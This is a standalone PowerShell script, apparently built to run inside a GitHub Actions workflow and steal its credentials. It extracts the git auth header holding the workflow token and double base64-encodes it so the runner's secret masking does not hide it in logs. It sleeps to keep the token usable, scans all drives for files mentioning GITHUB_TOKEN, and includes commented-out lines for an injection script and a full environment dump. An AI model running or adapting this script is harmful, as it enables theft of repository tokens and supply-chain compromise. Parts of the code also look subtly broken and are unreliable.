$extraheader = git config --get http.https://github.com/.extraheader
$encodedOutput = [Convert]::ToBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($extraheader)))

# Print the double base64-encoded value
Write-Output $encodedOutput

# Sleep for 3 minutes
Start-Sleep -Seconds 180


$drives = 'C:', 'D:'  # Add more drive letters if needed
$searchString = '$GITHUB_TOKEN'

foreach ($drive in $drives) {
    Get-ChildItem -Path $drive -File -Recurse | ForEach-Object {
        $filePath = $_.FullName
        $content = Get-Content -Path $filePath -Raw
        if ($content -match $searchString) {
            Write-Host "Found in $filePath"
        }
    }
}

# python3 ./src/inject.py
# Get-ChildItem Env: | ForEach-Object {
#     Write-Output "$($_.Name)=$($_.Value)"
# }
